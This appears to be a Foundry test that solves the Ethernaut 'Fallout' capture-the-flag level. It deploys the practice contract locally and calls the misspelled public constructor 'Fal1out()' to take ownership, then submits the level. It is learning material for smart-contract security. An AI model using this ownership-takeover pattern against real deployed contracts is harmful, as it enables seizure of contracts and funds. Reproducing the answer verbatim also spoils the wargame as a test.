pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "ethernaut/contracts/levels/FalloutFactory.sol";

contract FalloutExploit is DSTest {
    Vm private vm = Vm(address(HEVM_ADDRESS));
    Ethernaut private ethernaut;
    address private eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 1 ether);
    }

    function testExploit() public {
        // Setting up the level
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        // Exploit the contract
        // The method fallout is misspelled as fal1out, causing the constructor function to become
        // a public function that you can call anytime
        emit log_named_address(
            "Fallout contract owner",
            ethernautFallout.owner()
        );
        ethernautFallout.Fal1out();
        assertEq(ethernautFallout.owner(), eoaAddress);
        emit log_named_address(
            "New Fallout contract owner",
            ethernautFallout.owner()
        );
        emit log_named_address("Exploiter address", eoaAddress);

        // Submit the solution
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
